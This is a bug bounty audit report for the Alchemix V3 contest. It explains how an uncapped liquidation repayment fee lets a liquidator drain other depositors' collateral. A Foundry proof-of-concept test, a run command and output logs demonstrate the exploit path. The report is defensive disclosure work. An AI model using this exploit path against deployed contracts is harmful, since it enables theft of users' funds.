# 58276 sc critical uncapped feeinyield in resolverepaymentfee allows for collateral theft from other depositors

**Submitted on Oct 31st 2025 at 22:24:15 UTC by @Oxdeadmanwalking for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58276
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

During a user liquidation, a force repayment of earmarked debt is prioritized to allow a user's position to improve by removing earmarked debt before actually seizing their collateral. If this happens, the liquidator gets compensated in a form of a repayment fee which is a proportion of the debt repaid. However, when the debt of the account is cleared entirely after a force repayment (ie `account.debt == 0`), when `_resolveRepaymentFee` is called to calculate the fee before actually transferring it out to the liquidator, the fee does not actually get capped to the user's collateral balance meaning if it exceeds the collateral balance of the account being liquidated, a portion of it will be paid by other depositor's collateral making them lose funds.

## Vulnerability Details

`liquidate()` first tries to `_forceRepay` a position to clear earmarked debt in order to check if the account's position is improved by clearing earmarked debt first to avoid liquidation that way.

```
        // Try to repay earmarked debt if it exists
        uint256 repaidAmountInYield = 0;
        if (account.earmarked > 0) {
            repaidAmountInYield = _forceRepay(accountId, account.earmarked);
        }
```

After repayment of earmarked debt, a check is performed if \*\* all \*\* of the debt is cleared in order to return early. The caller (liquidator) gets compensated in the form of a repayment fee, calculated as a portion of the debt repaid in `_resolveRepaymentFee`.

```
        // If debt is fully cleared, return with only the repaid amount, no liquidation needed, caller receives repayment fee
        // this only works if the account only has earmarked debt
        if (account.debt == 0) {
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
            console.log("feeInYield == ", feeInYield);
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
```

`_resolveRepaymentFee` subtracts the fee from the user's collateral, if sufficient, but fails to cap the actual `fee` variable so the full calculated fee is returned in the code above before actually performing the transfer.

```
   /// @dev Handles repayment fee calculation and account deduction
    /// @param accountId The tokenId of the account to force a repayment on.
    /// @param repaidAmountInYield The amount of debt repaid in yield tokens.
    /// @return fee The fee in yield tokens to be sent to the liquidator.
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        @> fee = repaidAmountInYield * repaymentFee / BPS;
        @> account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
         // @audit, fee is never capped
        @> return fee;
    }
```

This means that `TokenUtils.safeTransfer(myt, msg.sender, feeInYield);` can send a fee greater than the user's collateral to the liquidator. In this case, the fee will come from the contract's MYT balance, meaning it will be socialized across other depositors which is problematic.

## Impact Details

Since the fee can be socialized across other depositors, if everyone tries to close their position, there won't be enough collateral left to service all withdrawals, making last users lose collateral that were owed to them. The deficit will accumulate with more liquidations of this kind.

## References

* <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900>
* <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L824>

## Proof of Concept

## Proof of Concept

1. Add this test to the end of `AlchemistV3.t.sol`

```
    function test_POC_liquidation_repayment_fee_theft_from_other_users() external {
        // Step 1: Mint whale supply for healthy global position
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // Step 2: Setup healthy global position to maintain good collateralization
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // Step 3: Create vulnerable position to be liquidated with depositAmount collateral
        vm.startPrank(externalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, externalUser, 0);
        uint256 victimTokenId = AlchemistNFTHelper.getFirstTokenId(externalUser, address(alchemistNFT));

        // Borrow max (90% LTV)
        uint256 mintAmount = alchemist.totalValue(victimTokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(victimTokenId, mintAmount, externalUser);
        vm.stopPrank();

        console.log("=== INITIAL STATE ===");
        (uint256 collateralBefore, uint256 debtBefore, uint256 earmarkedBefore) = alchemist.getCDP(victimTokenId);
        console.log("Victim collateral:", collateralBefore);
        console.log("Victim debt:", debtBefore);
        console.log("Victim earmarked:", earmarkedBefore);

        // Step 4: Create transmuter redemption to start earmarking debt
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        // Step 5: Advance blocks to earmark 100% of the debt
        vm.roll(block.number + 5_256_000);

        (uint256 collateralAfterEarmark, uint256 debtAfterEarmark, uint256 earmarkedAfterEarmark) = alchemist.getCDP(victimTokenId);
        console.log("\n=== AFTER FULL EARMARKING ===");
        console.log("Victim collateral:", collateralAfterEarmark);
        console.log("Victim debt:", debtAfterEarmark);
        console.log("Victim earmarked:", earmarkedAfterEarmark);

        // Step 6: Drastically reduce collateral by price drop
        // This simulates a scenario where collateral value crashed after debt was earmarked
        uint256 initialSupply = IERC20(mockStrategyYieldToken).totalSupply();
        uint256 newSupply = initialSupply * 150 / 100; // 50% drop in collateral value
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(newSupply);
        (uint256 collateralAfterDrop, uint256 debtAfterDrop, uint256 earmarkedAfterDrop) = alchemist.getCDP(victimTokenId);

        // Step 7: Record balances before liquidation
        uint256 alchemistMYTBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        address liquidator = makeAddr("liquidator");

        console.log("\n=== BEFORE LIQUIDATION ===");
        console.log("Alchemist MYT balance:", alchemistMYTBefore);
        console.log("Repayment fee (BPS):", alchemist.repaymentFee());
        console.log("Expected repayment fee ~=", alchemist.convertDebtTokensToYield(earmarkedAfterDrop) * alchemist.repaymentFee() / BPS);

        // Step 8: Trigger liquidation
        vm.startPrank(liquidator);
        console.log("Performing liquidation...");
        (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(victimTokenId);
        vm.stopPrank();

        // Step 9: Verify that the repayment fee came from other users' collateral
        uint256 alchemistMYTAfter = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorMYTAfter = IERC20(address(vault)).balanceOf(liquidator);
        (uint256 collateralFinal, uint256 debtFinal, uint256 earmarkedFinal) = alchemist.getCDP(victimTokenId);

        uint256 victimCollateralConsumed = collateralAfterDrop > collateralFinal ? collateralAfterDrop - collateralFinal : 0;
        uint256 alchemistConsumed = alchemistMYTBefore > alchemistMYTAfter ? alchemistMYTBefore - alchemistMYTAfter : 0;

        console.log("\n=== AFTER LIQUIDATION ===");
        console.log("Victim collateral consumed:", victimCollateralConsumed);
        console.log("Victim final collateral:", collateralFinal);
        console.log("Victim final debt:", debtFinal);
        console.log("Amount liquidated:", amountLiquidated);
        console.log("Fee received by liquidator:", feeInYield);
        console.log("Liquidator final MYT balance:", liquidatorMYTAfter);
        console.log("Alchemist MYT outflow:", alchemistConsumed);
    }
```

2. To make the issue more clear, `import "forge-std/console.sol";` at the top of `AlchemistV3` and add those logs to `_liquidate` at the lines during and after force repayment.

```
        // Try to repay earmarked debt if it exists
        uint256 repaidAmountInYield = 0;
        if (account.earmarked > 0) {
            console.log("account.earmarked > 0, performing force repayment");
            repaidAmountInYield = _forceRepay(accountId, account.earmarked);
        }
        // If debt is fully cleared, return with only the repaid amount, no liquidation needed, caller receives repayment fee
        // this only works if the account only has earmarked debt
        if (account.debt == 0) {
            console.log("\n ========== Inside AlchemistV3._liquidate, account.debt == 0 =============");
            console.log("account.debt == 0, performing repayment fee calculation");
            console.log("account.earmarked after force repayment == ", account.earmarked);
            console.log("account.collateralBalance after force repayment == ", account.collateralBalance);
            // @audit resolve repayment fee calculates the fee as a percentage of repaid amount
            // but if the collateral of the account is not enough then it does not cap it 
            // so in this case, where does the repayment fee come from?
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
            console.log("feeInYield == ", feeInYield);
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
```

3. Run the test

```
forge test --match-test test_POC_liquidation_repayment_fee_theft_from_other_users -vv
```

4. Observe the logs. You should see that the MYT outflow from alchemist exceeds the user's collateral liquidated. This indicates that the fee was paid from other depositor's collateral. In addition, in the logs from inside AlchemistV3 liquidation call, the user's collateral balance was 0 but `feeInYield` was >0.

```
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] test_POC_liquidation_repayment_fee_theft_from_other_users() (gas: 3072204)
Logs:
  === INITIAL STATE ===
  Victim collateral: 200000000000000000000000
  Victim debt: 180000000000000000018000
  Victim earmarked: 0
  
=== AFTER FULL EARMARKING ===
  Victim collateral: 200000000000000000000000
  Victim debt: 180000000000000000018000
  Victim earmarked: 180000000000000000018000
  
=== BEFORE LIQUIDATION ===
  Alchemist MYT balance: 400000000000000000000000
  Repayment fee (BPS): 100
  Expected repayment fee ~= 2700000000000000002969
  account.earmarked > 0, performing force repayment
  
 ========== Inside AlchemistV3._liquidate, account.debt == 0 =============
  account.debt == 0, performing repayment fee calculation
  account.earmarked after force repayment ==  0
  account.collateralBalance after force repayment ==  0
  feeInYield ==  2000000000000000000000
  
=== AFTER LIQUIDATION ===
  Victim collateral consumed: 200000000000000000000000
  Victim final collateral: 0
  Victim final debt: 0
  Amount liquidated: 200000000000000000000000
  Fee received by liquidator: 2000000000000000000000
  Liquidator final MYT balance: 2000000000000000000000
  Alchemist MYT outflow: 202000000000000000000000
```
